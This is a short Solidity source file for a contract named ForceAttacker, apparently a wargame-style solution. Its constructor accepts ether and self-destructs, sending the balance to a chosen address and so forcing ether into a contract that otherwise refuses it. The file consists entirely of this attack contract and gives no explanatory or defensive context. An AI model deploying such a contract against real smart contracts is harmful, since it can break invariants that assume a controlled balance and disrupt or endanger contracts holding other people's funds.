pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

contract ForceAttacker {

    constructor(address payable addr) payable {
        selfdestruct(addr);
    }

}
